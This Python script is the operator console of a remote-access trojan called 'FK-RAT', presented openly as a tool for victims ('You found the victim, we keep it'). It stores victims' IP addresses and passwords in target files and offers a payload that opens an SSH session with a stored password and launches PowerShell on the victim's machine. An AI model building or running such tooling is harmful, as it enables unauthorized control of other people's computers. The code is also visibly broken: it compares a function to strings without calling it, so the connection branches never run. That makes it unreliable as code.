#!/usr/bin/python
# python console for FK-RAT
# created by: Sunnickel
# inspired by: COSMO

import getpass
import os
import sys

from paramiko import SSHClient

## variables
banner = """
     ▄▀▀▀█▄    ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄ 
    █  ▄▀  ▀▄ █   █  █  █  █ █ █ █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐     █  █ ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ █   █   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ 
    ▐ █▄▄▄▄   ▐   █  ▐  ▐  █  ▀█ ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄       ▐  █▀▄    █▄▄▄▄▄    █▄▄▄▄▄  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄   
     █    ▐       █       █   █    █    █   █    ▌   ▄▀    █  ▀▄   █        █   █   █    ▌    █    ▌     █        █    ▌   ▄▀    █  ▀▄   █  
     █         ▄▀▀▀▀▀▄  ▄▀   █    ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   █     █    █▀▀▀       ▄▀   █   ▄▀▄▄▄▄    ▄▀▄▄▄▄    ▄▀        ▄▀▄▄▄▄   █     █    █▀▀▀   
    █         █       █ █    ▐   █     ▐   █    ▐   ▐     ▐    ▐          █    ▐   █    ▐    █    ▐   █          █    ▐   ▐     ▐    ▐      
    ▐         ▐       ▐ ▐        ▐         ▐                              ▐        ▐         ▐        ▐          ▐                          


        [::] Finders Keepers | You found the victim, we keep it
        [::] Created by : Sunnickel
        [::] Inspired by : BlueCosmo
"""
help_menu = """
        Arguments:
            load      = Load a config file  
            new       = Make a new config file

        Example:
            python3 main.py -f sunnickel.fkrat


"""
option_menu = """
        [*] Select a number to use a payload

        Payloads:
            [0]     Remote Console
"""
target_menu = """
        [*] Select a Target
        
        Targets:
"""

username = getpass.getuser()
header = f"{username}@FK-RAT"


# read config file
def read_config(config_file):
    configuration = {}

    # get file content
    read_lines = open(config_file, "r").readlines()

    # get target information
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIR"] = "C:/Users/" + read_lines[2].strip()

    # return config
    return configuration


# connects RAT to target
def connect(config_file):
    config = read_config(config_file)
    ipv4 = config.get("IPADDRESS")
    target_password = config.get("PASSWORD")
    working_directory = config.get("WORKINGDIR")

    # remote connect
    target = SSHClient()
    if os_detection == "w":
        print(target_password)
        os.system(f"ssh fkrat@{ipv4} 'powershell'")
    if os_detection == "l":
        os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} 'powershell'")


# command line interface
def cli(arguments):
    print(banner)
    argument = sys.argv[1]
    if arguments:
        target_file = ""
        if argument == "new":
            file_name = input(f"Filename   : ")
            username =  input(f"Username   : ")
            ip =        input(f"Ip         : ")
            password =  input(f"password   : ")
            if not os.path.exists("./targets"):
                os.mkdir("./targets")
            target_file = open(f"./targets/{file_name}.fk", "x")
            target_file = open(f"./targets/{file_name}.fk", "w")
            target_file.write(f"{ip} \n{password} \n{username}")
            argument = target_file
        print(target_menu)
        if argument == "load" or argument == target_file:
            targets = []
            i = 0
            for file in os.listdir("./targets"):
                if file.split('.')[1] == "fk":
                    print(f"            [{i}]     {file.split('.')[0]}")
                    targets += [file]
            if len(os.listdir("./targets")) == 0:
                print(f"            [-]     No targets found")
                print(help_menu)
                exit(0)

            option = input(header + " $ ")
            if len(option) <= len(targets):
                try:
                    choosenfile = targets[int(option)]
                except IndexError:
                    print("[!!] Please enter a valid file")
                    exit()
                print(option_menu)
                option = input(header + " > " + choosenfile + " $ ")
                if option == "0":  # SSH Connection to target
                    connect("./targets/" + choosenfile)

    else:
        print(help_menu)


# detects what os is used
def os_detection():
    # windows
    if os.name == "nt":
        return "w"
    # linux
    if os.name == "posix":
        return "l"


# main code
def main():
    ## check for args
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    cli(arguments_exist)


# run main code
if __name__ == "__main__":
    main()
